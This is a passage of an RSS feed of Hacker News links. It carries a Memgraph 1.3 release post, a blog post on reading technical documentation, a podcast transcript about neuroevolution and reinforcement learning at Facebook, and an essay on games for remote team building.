<p>Memgraph uses snapshots and WAL files as durability files. These are used to reconstruct the database to the most up-to-date version. Up to now, there was no reliable way to back up those durability files while an instance is running, so to back up a database, one had to either dump it (using the <code>DUMP DATABASE</code> query), or kill the instance, and then back up the durability files.</p>
<p>To make a live backup easier, we added a locking query <code>(LOCK | UNLOCK) DATA DIRECTORY</code> that does just what it says - it prevents the instance from deleting durability files from it, giving the user the opportunity to back them up without fear of data loss. No more backup roulette!</p>
<h2>New And Improved Logging</h2>
<p>We’ve also improved the logging, which is now both faster and more configurable. Now the user can control the level of logging with the <code>--log-level</code> flag. No more techno gibberish when you don’t want it, and more gibberish when you need it!</p>
<h2>Query Type Deduction Done Right</h2>
<p>We’ve gotten around to implementing the so-called read-write type deduction properly. We faked it before, just to appease the Neo4j driver gods. Turns out, this type can be actually useful! For example, we use the type of the query to forbid write queries on replicas. Nifty, right?</p>
<h2>What’s Next?</h2>
<p>Go on, try it out! You can <a href="https://memgraph.com/download">download the 1.3 version</a>.</p>
<p>If you’re interested in the replication feature, check out this <a href="https://docs.memgraph.com/memgraph/reference-guide/replication">reference guide</a>, or this <a href="https://docs.memgraph.com/memgraph/database-functionalities/replication">how-to guide</a> if you want to get your hands dirty.</p>
<p>If you catch any bugs or generally weird behavior, please drop us a line on our <a href="https://discourse.memgraph.com/">forum</a>.</p>
<p>Happy hacking!</p>
</div></div>]]>
            </description>
            <link>https://memgraph.com/blog/memgraph-1-3-release</link>
            <guid isPermaLink="false">hacker-news-small-sites-25989934</guid>
            <pubDate>Mon, 01 Feb 2021 16:14:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The career-changing art of reading the docs]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25989676">thread link</a>) | @forrestbrazeal
<br/>
February 1, 2021 | https://acloudguru.com/blog/engineering/the-career-changing-art-of-reading-the-docs | <a href="https://web.archive.org/web/*/https://acloudguru.com/blog/engineering/the-career-changing-art-of-reading-the-docs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default"><div><p>Every so often I get asked for advice on how to become an <a href="https://aws.amazon.com/developer/community/heroes/">AWS Hero</a>.</p><p>The specific answer isn’t that interesting – “get involved in the community and hope someone nominates you as a Hero” seems to be the process at AWS. I understand that the <a href="https://mvp.microsoft.com/en-us/overview">Microsoft MVP process</a> is a bit more transparent and better prescribed.</p><p>But the general question of “how do I become well-respected in my chosen technical specialty” is VERY interesting. Even if you don’t have any aspirations to build a public following, there is tremendous career value in becoming the go-to person within your technical niche.</p><p>The person who everybody on your team comes to with their toughest question about that language or framework. The person who knows where all the bodies are buried in ActiveDirectory or Typescript or DynamoDB. Those folks have great careers and job security because authoritative knowledge like that is rare.</p><p>To some extent, it’s rare because wisdom only comes with experience. But I know plenty of engineers who’ve sat in the same chair for ten years getting the same year of experience ten times. Heck, I’ve been there myself; I spent a couple of years as an “accidental DBA” who never really learned that much about SQL Server beyond what the daily firefighting required.</p><p>I used to spend a lot of time wondering how other people seemed to level up so quickly on new technologies. How do you break through that stagnant cycle of learning and forgetting stuff in bits and pieces, using the same technology for years without ever feeling like an expert?</p><p>A few years ago I learned a secret for doing this, a cheat code if you will, from my fellow AWS Hero <a href="https://acloudguru.com/blog/author/jared-short">Jared Short</a>. This is his secret recipe for leveling up in tech:</p><p><strong>Read the documentation for one job-relevant technology, cover-to-cover, every week. </strong></p><figure><div><blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">Forrest is giving away my secrets, but it's true. I'd estimate around 700+ hours of just reading AWS docs over my career with intent to retain / learn (not just reference). It feels silly until you almost immediately understand some esoteric side-effect or behavior. <a href="https://t.co/juQ0b9mENI">https://t.co/juQ0b9mENI</a></p>— Jared Short (@ShortJared) <a href="https://twitter.com/ShortJared/status/1347629518312378369?ref_src=twsrc%5Etfw">January 8, 2021</a></blockquote> </div></figure><h2 id="h-reading-docs-the-wrong-way-and-the-right-way">Reading docs: the wrong way and the right way</h2><p>I get it, that doesn’t sound revolutionary. “<a href="https://en.wikipedia.org/wiki/RTFM">RTFM</a>” is literally as old as computing itself. It’s the classic kiss-off answer to questions you ought to be able to Google.</p><p>And that betrays a key limitation in how a lot of us think about documentation. We think of it tactically, as a resource to query when we have a specific question or encounter a particular error. We use docs to fill in our <em>known unknowns.</em></p><p>That’s how you can get stuck for years, say, administering a PostgresSQL cluster and never really becoming that deep of an expert on Postgres. If you only learn something new when the situation demands it, your mental model of Postgres (or whatever) will look like a gradually expanding version of this:</p><figure><img loading="lazy" width="2181" height="1647" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/01/tactical.png" alt="" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/01/tactical.png 2181w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/01/tactical.png 300w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/01/tactical.png 1024w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/01/tactical.png 768w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/01/tactical.png 1536w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/01/tactical.png 2048w" sizes="(max-width: 2181px) 100vw, 2181px"></figure><p>Over time, as you encounter more new use cases for the technology, you’ll burn more “never forget” bubbles into the mental model. But you’ll still have this heavy sense of unknown unknowns hanging over you, and you’ll never be sure if you’re really using the optimal approach to solve a new problem.</p><p>Instead, Jared’s approach is to read docs strategically<em>, </em>preemptively, curiously: as a way to fill in your <em>unknown unknowns</em>. The things you might not encounter in ten years, but that would cost you two days of troubleshooting if you ran into them tomorrow.</p><p>Read docs like novels (cover to cover), not like dictionaries (look up the term, cross-reference, and stop). Over time, that strategy will lead to a mental model of your professional domain that looks more like this:</p><figure><img loading="lazy" width="727" height="549" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/01/strategic.png" alt="" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/01/strategic.png 727w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2021/01/strategic.png 300w" sizes="(max-width: 727px) 100vw, 727px"></figure><p>(This is <a href="https://acloudguru.com/blog/engineering/how-many-certifications-do-i-need-to-get-a-cloud-job">the same benefit</a> you get from studying for certifications, by the way: you’re building a mental map of the domain, so you don’t have to stumble through the darkness on every new quest.)</p><p>On the surface, that sounds simple, but it’s far from easy. Here are three common objections people raise when I advise reading docs as a career-advancement strategy:</p><h4 id="h-i-don-t-have-a-photographic-memory-i-ll-never-remember-a-bunch-of-random-docs"><strong>“I don’t have a photographic memory. I’ll never remember a bunch of random docs.”</strong></h4><p>Back when I was in college, a well-meaning friend convinced me I should read a book on SAP. Forget today — I couldn’t have told you a single thing about SAP <em>ten minutes after finishing that book</em>. I’d never been inside an enterprise, much less understood the problems these ERP integrations I was reading about were supposed to solve. It was like trying to talk to the aliens in the movie <em>Arrival</em>: my brain was the wrong shape.</p><p>Likewise, you probably won’t get much value out of glancing through docs for a technology you don’t use and have no context for.</p><p>So do these two things:</p><p>1. <strong>Focus on docs for technologies you are already using</strong>. We’ve all had that mind-numbing feeling when plowing through some esoteric text that doesn’t relate to our daily lives, where you glaze over for three pages and then go, “what did I just read?”</p><p>Avoid this by focusing on docs for technologies or languages you’ve already got a vested stake in – say, because they’re on your plate at work or you’re trying to build them into a side project.</p><p>Encourage active reading and engagement with the information by asking yourself questions like these as you read:</p><ul id="block-ef7bb5e0-252c-434f-98de-116c8c0e2003"><li>Did I understand that? (If not, maybe read the section again)</li><li>Does what I just read match my existing mental model of how this technology works? (If not, do I need to go review a different doc and then come back to this?)</li><li>Could this feature or fact help me on my current project?</li><li>If I had known this six months ago, what would I have done differently? (“Chosen a different technology” is a totally acceptable answer!)</li></ul><p>Then, <strong>2. Read those docs repeatedly, on a schedule, over and over</strong>. Seriously. If you’re on a team that’s building out centralized CI/CD for Azure, maybe read the part of the Azure DevOps docs on pipelines this week and the part on build agents next week, and when you get to the end, start over. The cloud changes fast. You’ll fold in new information at the same time you’re reinforcing the old.</p><h4 id="h-i-don-t-have-time-to-read-a-bunch-of-documentation"><strong>“I don’t have time to read a bunch of documentation.”</strong></h4><p>Yes, and weeks of work can save you hours of planning. Maybe use some of the time you currently spend injecting “HERE” print statements into your code to figure out why it’s not working.</p><figure><img src="https://faasandfurious.com/pages/debugging-tactics.png" alt="Debugging Tactics"></figure><p>More seriously, it’s not a bad idea to block a bit of time on your calendar each day – 30 minutes, even –  for targeted doc-reading. You may find it hard to carve that time out of your workday, but defending time and setting expectations with your manager is its own skill, worth practicing. Call the block of time “deep work.” It is.</p><h4 id="h-the-docs-for-technology-x-are-no-good-trust-me-they-re-not-worth-reading"><strong>“The docs for [technology X] are no good. Trust me, they’re not worth reading.”</strong></h4><p>I don’t always buy this excuse. The docs might not be that bad; you might just have the wrong expectations.</p><p>For example, the AWS documentation gets <a href="https://twitter.com/IanColdwater/status/1347737875991777280">a terrible rap</a> for being wordy and poorly-organized. And it’s maybe even worse than you’ve heard – if you’re trying to look up the name of an IAM action or the syntax of a CLI command, that is.</p><p>But as an educational tool that dives deep on the architectural underpinnings and technical limitations of services, the AWS docs are <em>fantastic. </em>They’re better than any book you could ever buy about the cloud. (And the <a href="https://aws.amazon.com/builders-library/">Builder’s Library</a> is better still.) The AWS docs are designed not just to be referenced, but to be read. Read ’em!</p><p>On the other hand, some types of docs like step-by-step tutorials are very much designed to be referenced during hands-on builder time. It may not make sense to spend a lot of time reading those in the abstract. So bring your common sense.</p><p>However. There are also plenty of technologies out there where the docs are truly incomplete, out of date, or just plain wrong – many smaller open-source projects, in particular.</p><p>Turns out you have another option here, at least for OSS projects: <em>read the source code.</em> Not sure what a module does, what its edge cases are, what the error code means? Read the source code and find out! It might be faster than (and will definitely be at least as accurate as) looking for the answer in the docs, <em>even if the docs are pretty good. </em></p><p>If you write code for a living, reading other people’s shipped, battle-tested code — not just PRs from your own team — is genuinely one of the most transformative things you can do for your career. Because while you’re answering your immediate question, you’ll also be picking up style, organization, and technique from professional programmers operating under all kinds of interesting constraints. Seriously. Read code.</p><p>(And then, if it’s open-source, maybe consider contributing some docs!)</p><h2 id="h-what-do-i-get-out-of-all-this"><strong>What do I get out of all this?</strong></h2><p>If you read a targeted set of docs consistently over a sustained period — say, a couple of years — while actively practicing on that technology, you will be able to perform magic. That’s a promise.</p><p>Let’s go back to Jared Short again for an example. (Yes, I checked with Jared, he graciously agreed to let me spill his secrets in this piece.) As an engineer at an AWS shop, Jared …</p><ul><li>Reads the documentation for one AWS service, cover to cover, every week.</li><li>Blocks daily time for this on his calendar.</li><li>Focuses on services he’s actually using at work (he tells me that so far in 2021, he’s been through all the docs for Lambda, AppSync, and Step Functions).</li></ul><p>Jared’s been doing this week in, week out, for *years*. And that  unglamorous commitment lets him perform nerd magic like this:</p><figure><div><blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">I needed to understand extensions better for a thing, read the docs cover to cover like an insane person.</p>— Jared Short (@ShortJared) <a href="https://twitter.com/ShortJared/status/1347612782389301249?ref_src=twsrc%5Etfw">January 8, 2021</a></blockquote> </div></figure><p>If you don’t want to take the time to read that whole Twitter thread, let me sum it up for you.</p><ol><li>An experienced AWS engineer encounters a weird behavior: AWS Lambda seems to be executing code when it should not be. He posts a plea for help on Twitter.</li><li>Other experienced engineers take a look and go, “huh. Weird.” To be clear, this is not a case of RTFM. The problem is nontrivial and the solution, if there is one, is not well-known. …</li></ol></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acloudguru.com/blog/engineering/the-career-changing-art-of-reading-the-docs">https://acloudguru.com/blog/engineering/the-career-changing-art-of-reading-the-docs</a></em></p>]]>
            </description>
            <link>https://acloudguru.com/blog/engineering/the-career-changing-art-of-reading-the-docs</link>
            <guid isPermaLink="false">hacker-news-small-sites-25989676</guid>
            <pubDate>Mon, 01 Feb 2021 15:51:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reinforcement Learning at Facebook]]>
            </title>
            <description>
<![CDATA[
Score 103 | Comments 27 (<a href="https://news.ycombinator.com/item?id=25989578">thread link</a>) | @agbell
<br/>
February 1, 2021 | https://corecursive.com/061-reinforcement-learning/ | <a href="https://web.archive.org/web/*/https://corecursive.com/061-reinforcement-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><i>Note: This podcast is designed to be heard. If you are able, we strongly encourage you to listen to the
audio, which includes emphasis that’s not on the page</i></p><div>
<h2 id="intro"><strong>Intro</strong></h2>
<div>
<picture><source srcset="https://corecursive.com/assets/generated/061/wide-800-8fd4f2a27.webp 800w" type="image/webp"><source srcset="https://corecursive.com/assets/generated/061/wide-800-8fd4f2a27.png 800w" type="image/png"><img width="600px" src="https://corecursive.com/assets/generated/061/wide-800-8fd4f2a27.png" alt="Computer Repair"></picture>
</div>
<p><strong>Adam:</strong>
Hey, so before We get into it, why don’t you state your name and what you do?</p>
<p><strong>Jason:</strong>
My name is Jason Gauci. And yeah, I bring machine learning to billions of people.</p>
<p><strong>Adam:</strong>
Hello and welcome to CoRecursive, the stories behind the code, I’m Adam Gordon Bell. Jason has worked on YouTube recommendations. He was an early contributor to TensorFlow, the open source machine learning platform. His thesis work was cited by DeepMind. They were the people who beat all human players at Go, and that’s StarCraft, I think. And who knows what else?</p>
<p>If you ever wanted to learn about machine learning, you could do worse than have Jason teach you. But what I find so fascinating with Jason is he recognized this problem that was being solved the wrong way and set out to find a solution to it.</p>
<p>The problem was making recommendations, like on Amazon, people who bought this book might like that book. He didn’t exactly know how to solve the problem, but he knew it could be done better. So that’s the show today, Jason’s going to share his story, but you will eventually change the way Facebook works. And we’ll learn about reinforcement learning and neural nets, and just about the stress of pursuing research at a large company. It all started in 2006 when Jason was in grad school.</p>
<h2 id="phd-program"><strong>PHD Program</strong></h2>
<div>
<picture><source srcset="https://corecursive.com/assets/generated/061/computer-repair-800-660802488.webp 800w" type="image/webp"><source srcset="https://corecursive.com/assets/generated/061/computer-repair-800-660802488.jpg 800w" type="image/jpeg"><img width="400px" src="https://corecursive.com/assets/generated/061/computer-repair-800-660802488.jpg" alt="Computer Repair"></picture>
</div>
<p><strong>Jason:</strong>
Yeah, so I went to college, picked computer science, and I remember my parents found out a little strange. They said, “Oh, you could be a doctor or a lawyer or something, you have the brains for it.” And then at one point my dad thought it was kind of like going to school to be a TV repairman. And so he wasn’t really sure, he’s like, “Are you sure you really want to do this? Now I could just buy another TV or another computer if it breaks.” And to this day, I have to explain to people, I really don’t know how to fix computer. If this laptop broke right now, I’d just have to do the same thing my parents do and just go get another one, I have no idea.</p>
<h2 id="capture-the-flag"><strong>Capture The Flag</strong></h2>
<p><strong>Jason:</strong> But I had an option to do a Master’s, PhD hybrid or basically do it all in one shot. And after two years, if I wanted to call it quits, then I would get the Master’s degree. Yeah, at the time I thought I will just do the Master’s, I didn’t really plan on getting a PhD. But actually the very last class that I took in my Master’s was a class called neuro evolution, which was all about trying to solve problems through neural networks and through evolutionary computation.</p>
<p>So America Online had this capture the flag game for free. And I remember I downloaded it on a 56K modem, it took forever. And it was basically like a turn-based capture the flag where you played as one person, and there was a friendly AI for the other three players, and then there was four player enemy AI, and you’re trying to capture the flag. And if the enemy touched you, you’re in jail, but the friendly AI could bail you out of jail.</p>
<p><strong>Adam:</strong>
I think I played this. Do you get to see more and more of the ground as you travel?</p>
<p><strong>Jason:</strong>
Yeah, that’s right. Yeah. Yeah. Do you remember the name of it?</p>

<p><strong>Adam:</strong>
So the game is called Capture the Flag. If you’ve not played it, you view a large field with trees in it from overhead, and you can only see where your players have been, there’s a fog of war like in StarCraft. Except it’s turn-based, you move a certain number of moves and then your players freeze there, and the computer gets to take its turn and move its players.</p>
<h2 id="what-is-a-neural-net"><strong>What Is a Neural Net?</strong></h2>
<div>
<picture><source srcset="https://corecursive.com/assets/generated/061/nn-774-55bf335d9.webp 774w" type="image/webp"><source srcset="https://corecursive.com/assets/generated/061/nn-774-55bf335d9.png 774w" type="image/png"><img width="800px" src="https://corecursive.com/assets/generated/061/nn-774-55bf335d9.png" alt="Capture The Flag"></picture>
</div>
<p><strong>Jason:</strong>
But for my neuro evolution course, my final project, I recreated this game, capture the flag. And then I built an AI for it using neuro evolution. And so just to unpack that, neural networks are effectively like function approximators that are inspired by the way the brain works. And so if you imagine graphing a function on your calculator, I’m sure everyone’s done this on their TI 85. You can punch in Y equals X squared and it’ll draw a little parabola on your TI 85 or whatever the calculator is nowadays. And so what a neural network will do is it will look at a lot of data and it can represent almost any function.</p>
<p><strong>Adam:</strong>
So if it’s your original graph thing, it’s like telling it X is two, Y is three. You’re feeding it all these pairs.</p>
<p><strong>Jason:</strong>
Exactly. Yep.</p>
<p><strong>Adam:</strong>
Memorizes them.</p>
<p><strong>Jason:</strong>
Yep. But because there’s contradictions and there’s noise in the data and all of that, you won’t tell it exactly, force it to be Y is three when X is three. But it’s a hint. You say, “Hey, when X is three, Y’s probably three.” So if you’re not there, get a little bit closer to there. And you do this over and over again for so many different Xs that you end up with some shape that won’t pass through every point, it’s usually impossible, but it will get close to a lot of the points.</p>
<h2 id="where-it-fails">Where It Fails</h2>
<p><strong>Adam:</strong>
This is basically back propagation. It’s a form of supervised learning. You’re training the neural net by supervising it and telling it when it gets the wrong answer, what it should have gotten instead. And to do this, you need to know what the right answer is so that you can train it.</p>
<p><strong>Jason:</strong>
And so that works great to when you have a person going and telling you the perfect answer or the right answer. But for puzzles and games, for example, you don’t have that. So look at Go, to this day, people haven’t found the perfect Go game, a Go game for people who are playing perfectly. And so you don’t have that. And so you have to do something different, you have to learn from experience. So you just say, “Look, this Go game, that’s a really good move. That’s better than any move we’ve ever seen at this point in the game.” It doesn’t mean it’s the best, it doesn’t mean that your goal should be to always make that move, but it’s really good.</p>
<p>A simple way to do that is have a neural network and have it play a lot of Go, and then make a subtle change to it, and have it play a lot of Go again. And then say, “Okay, did that change make this player win more games?”</p>

<p>If it did, then you keep the change. And if it didn’t, then you throw it away. And so if you do this enough times, you will end up in what we call a local optimum. In other words, you’re making these small changes, you’re picking all the changes that make their Go player better, and eventually you just can’t find a small change that makes the player better. And so you could think of evolutionary computation at a high level as doing something like that, but it’s doing it a really large scale.</p>
<p>So maybe you have a thousand small changes and 500 of them make the player better. And you can adapt all 500 of those different players and the existing players, you can take all 501 of those players and make a player that’s step-wise, that’s better in a big way. And you would just keep doing that.</p>
<p><strong>Adam:</strong>
So this is what Jason learned in his neuro evolution class. He would create all these generations of players, which had random changes, and like evolution, have them play capture the flags against each other, slowly breeding better and better players.</p>
<h2 id="jason-watches-his-creation"><strong>Jason Watches His Creation</strong></h2>
<p><strong>Adam:</strong>
Was there a moment where you tested out your algorithm? Did you try to play it and capture the flag?</p>
<p><strong>Jason:</strong>
Yeah, the real aha moment was, having this God’s eye view without the fog of war, because I was just an observer, and watching the AI. And specifically watching this almost like Wolfpack behavior, where three players would surround a player and trap them. Just seeing that thing that you’ve seen in nature just emerge organically, that to me was amazing.</p>
<p>That was unbelievable.</p>
<p>When I saw all the players converge and capture and do this methodical thing and then take the flag. And even, I think at one point two of them had been captured, and so the other two just decided to go for the flag and just forget about any strategy and just go for broke.</p>
<p><strong>Adam:</strong>
Did you watch it and anthropomorphize? Did you cheer for one team?</p>
<p><strong>Jason:</strong>
Yeah. Yeah. Yeah, I did. Naturally, you don’t want to cheer for the underdog. So yeah, you would see this scenario play out where they would chase after one person, even though there was four of them and only two of the other team, they would chase after one and the other one would get the flag.</p>
<p><strong>Adam:</strong>
I didn’t follow the strategy. One runs, and then…</p>
<p><strong>Jason:</strong>
Yeah. So one would run and the other four would all chase after that one. And then the second one would go and get the flag and win.</p>
<p><strong>Adam:</strong>
It’s like a decoy.</p>
<p><strong>Jason:</strong>
Yeah, but it would only happen when the AI was this advantaged. So the way it worked was there’s four players, so there’s a bunch of sensory information that was just repeated four times to make the input of the network. And I guess even though it’s playing against itself, it learned that when two of those inputs are completely shut off, which is what happened when they were captured, to then execute this hail Mary strategy. And yeah, it was just super fun to watch that play out. And I would remember just sitting in the lab cheering for this one person and they would try to come back. In your head, it was hard to know, because it was a big grid, can they get back quick enough to catch this person? So it’d be pretty suspenseful.</p>

<p>And just seeing all of that, just all encoded in this network, neural, excitation back prop and all these things for understanding what a neural network is doing, all this stuff hadn’t been invented yet. So it was just a black box and it was just magic. You would run it on the university cluster, who knows what it would do, you would get it back a few days later and you would just see all this amazing emergent behavior. That to me just really lit the spark.</p>
<p>And so I had already accepted a job with the intention of just getting a Master’s and leaving because I just didn’t see anything that inspired me. But right there at the 11th hour, I took this course. And I said, “This is amazing.” …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://corecursive.com/061-reinforcement-learning/">https://corecursive.com/061-reinforcement-learning/</a></em></p>]]>
            </description>
            <link>https://corecursive.com/061-reinforcement-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25989578</guid>
            <pubDate>Mon, 01 Feb 2021 15:39:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Games can fix remote team building]]>
            </title>
            <description>
<![CDATA[
Score 71 | Comments 65 (<a href="https://news.ycombinator.com/item?id=25989336">thread link</a>) | @masonhipp
<br/>
February 1, 2021 | https://slideswith.com/blog/games-for-remote-team-building | <a href="https://web.archive.org/web/*/https://slideswith.com/blog/games-for-remote-team-building">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>The problem: remote work makes it dramatically harder to socialize with your teammates.</strong></p>
<p>There's no going to the bar, you can't read body language, and spontaneous conversation evaporates. The fundamentals of team building are the same — communication, shared values, camaraderie, and a belief in the company mission  — but the avenues for establishing those foundations are severely limited when remote.</p>
<p><mark>Online games can solve many of challenges of inherit to remote team building.</mark></p>
<p>Games do several things that make them ideal for building strong connections and creating closeness between peers. They can:</p>
<ul>
<li>lower the bar to social interaction</li>
<li>create unique shared experiences</li>
<li>provide a safe environment for deeper conversation</li>
<li>provide beneficial structure to group interactions</li>
<li>make the most of limited-bandwidth video calls</li>
<li>allow teamwork to be practiced with lower stakes</li>
</ul>
<p>It's also much easier to get buy-in for a trivia night or a game that's fun and amusing than it is to get people excited about yet another zoom happy hour. Let's take a look at why game dynamics are so useful for online connection.</p>
<h2 id="games-create-inclusive-conversations-that-work-online">Games create inclusive conversations that work online</h2>
<p>An important aspect of building a strong team is breaking down the walls between each of the various team members and fostering connections between them. This can be difficult to do naturally in the real world and it is even more challenging virtually.</p>
<p>Most events don't run with an ideal structure for team building, and conversations end up too focused on one speaker or a free-for-all dominated by the loudest voices.</p>
<p><img alt="" src="https://d33wubrfki0l68.cloudfront.net/f9ffbdad43c032944434345296afb2464462dc95/c16e4/images/blog/natural-group-interaction-opt.svg"></p>
<p>With the right game you can create a conversational structure that is much more inclusive and ideal for team boding. Additionally, game conversations are frequently turn-based and lend themselves naturally to online conversation with larger groups.</p>
<p><img alt="" src="https://d33wubrfki0l68.cloudfront.net/8a4599e657de5c00626214a2e1199304450465b2/fed64/images/blog/ideal-group-conversation-opt.svg"></p>
<h2 id="games-teach-teamwork-in-fast-low-risk-environment">Games teach teamwork in fast, low-risk environment</h2>
<p>A high-functioning remote team will be able to work cohesively toward a single goal. The members will understand their strengths, understand how to communicate with one another, and be able to work as an effective and coordinated whole. Learning to do this can take a lot of time.</p>
<p><strong>Games offer a fast iteration cycle with lower consequences of failure, providing an ideal environment for learning to work as a team.</strong></p>
<p>The social cooperation required in games is often very similar to the real world. The communication and interpersonal challenges of a job are frequently replicated in online games — but without the high stakes and risk of real world performance and deadlines.</p>
<p>It's also possible to run through many more teamwork scenarios in a game than it is in a real-world work environment. Being able to play multiple games or challenges in a short period of time can also provide more opportunity to learn how to work together than the equivalent period of time working together on an actual project with real-world consequences.</p>
<h2 id="games-offer-a-safe-space-to-talk-about-real-things">Games offer a safe space to talk about real things</h2>
<p>Creating real friendships between team members requires a degree of vulnerability that can be difficult to surface in a day-to-day conversation, and is particularly challenging over video calls.</p>
<p>Friendships between team members generally start with small talk and slowly grow in trust and closeness over time. When it happens naturally, this process can take a long time and requires a lot of interaction (the ratio of real conversation to small talk is very low).</p>
<p>According to psychologist Arthur Aron, who you might know from the popular NY Times article <a href="https://www.nytimes.com/2015/01/09/style/no-37-big-wedding-or-small.html" rel="nofollow noopener noreferrer" target="_blank">36 Questions to Fall In Love</a>, the key to forming close bonds is a gradual increase in mutual vulnerability (real conversations):</p>
<blockquote>
<p>“One key pattern associated with the development of a close relationship among peers is sustained, escalating, reciprocal, personal self-disclosure.”</p>
<p>— Aurthor Aron, et. al. <a href="https://journals.sagepub.com/doi/pdf/10.1177/0146167297234003" rel="nofollow noopener noreferrer" target="_blank">The Experimental Generation of Interpersonal Closeness</a></p>
</blockquote>
<p>From a corporate team building perspective the point is this: creating bonds inside of your team will eventually require team members to show mutual vulnerability and have real conversations.</p>
<p>At a company office there is an enormous volume of interactions and all of this happens organically, but we don't have that luxury when working virtually. To be most effective at team building online requires a very intentional approach that prioritizes real conversation and self-disclosure.</p>
<p>Games can add exactly this structure to conversations (as mentioned above) and the games themselves can be specifically designed to foster self-disclosure and real conversation in an approachable and fun environment.</p>
<h2 id="games-help-overcome-the-lower-fidelity-of-video-calls">Games help overcome the lower fidelity of video calls</h2>
<p>Interpersonal communication typically uses an incredible amount of information bandwidth: we instinctively monitor body movements, miniscule sound inflections, facial micro-expressions, <a href="https://en.wikipedia.org/wiki/Proxemics" rel="nofollow noopener noreferrer" target="_blank">proxemics</a>, and much more in instantaneous real time.</p>
<p>Trying to have a conversation over video chat, on the other hand, leads to a near complete breakdown of nonverbal cues and a substantial degradation of verbal communication. Experts have roundly agreed that <a href="https://www.nationalgeographic.com/science/2020/04/coronavirus-zoom-fatigue-is-taxing-the-brain-here-is-why-that-happens/" rel="nofollow noopener noreferrer" target="_blank">Zoom fatigue is both real and costly</a>, and many of them agree that the root cause is related to latency, bandwidth, and the breakdown of natural information transfer between parties (e.g. eye contact).</p>
<blockquote>
<p>“For somebody who’s really dependent on non-verbal cues, it can be a big drain not to have them,”</p>
<p>— Andrew Franklin, assistant Professor of Cyberpsychology at Norfolk State University</p>
</blockquote>
<p>Given how much less bandwidth is available during online communication, many teams instinctively gravitate toward a "transactional only" approach to meetings. This can provide some benefits — calls are shorter, reducing overall fatigue, and there is a tighter schedule of defined work — but this approach entirely eliminates relationship building. Some teams can function this way (if they've known each other for a while), but for many this elimination of team interaction is a major problem.</p>
<p>Games can help overcome the bandwidth and latency issues by creating a clear structure for communication. Structured, rule-based conversations remove the need for each participant to dynamically read the room to know when to talk and what to say. <mark>The rule-based structure of games replaces the need to follow the meta-structure of a group conversation, allowing the participants focus on the <em>content</em> of the </mark>communication and not who's turn it is to talk.</p>
<p>Structured communication can also reduce conversational error rates (e.g. people talking over each other) and overall make the most of a reduced-bandwidth environment.</p>
<h2 id="games-lower-social-barriers-and-create-buy-in">Games lower social barriers and create buy-in</h2>
<p>The easiest way to silence a video call is to ask a deep or open-ended question — people will immediately shut down, trying avoid a situation where they might get burned in front of their peers.</p>
<p><img alt="" src="https://d33wubrfki0l68.cloudfront.net/617201462cf33e37820b89fe119005f69bd1e668/e35ff/images/blog/share-personal-information-optimized.svg"></p>
<p><strong>Sharing personal information is inherently risky, but games provide rules that make it safer. Few people will volunteer personal information to a group, but during a game almost everyone will participate freely when it comes to their turn.</strong></p>
<p>Games provide a safe space for interaction that can make it easier and less risky to be yourself, and in fact even rewards everyone for participating. How many people would do an impression of a farm animal in front of a group? How about during a game of charades?</p>
<p>The other interesting benefit of games is that they are more fun by default. Getting your team to buy into a zoom happy hour or team building exercise is tough — but getting them excited about a game of trivia or escape room is much easier.</p>
<h2 id="games-encourage-active-attention">Games encourage active attention</h2>
<p>One very powerful aspect of an online game is that it generally requires all participants to pay attention or risk losing or being called out. <mark>The active attention of a game environment is in direct contrast with many zoom meetings where half of the audience could be in a different tab while you're talking</mark>.</p>
<p>As you might imagine from real-world conversations, paying active attention is a prerequisite for building real relationships and bonds, and games are an excellent tool for creating an environment that's ripe for team building.</p>
<p>A word of caution: active engagement can be very tiring, particularly on video calls, and an overuse of games to force paying attention can easily result in a exhausted audience. The key to avoiding this is proper spacing, breaks, and the right frequency of use.</p>

<p>Think back to a conversation you had with a group of friends or close coworkers. How often did somebody say "do you remember when we did X" .. or ..  "what was that movie we watched during..?"</p>
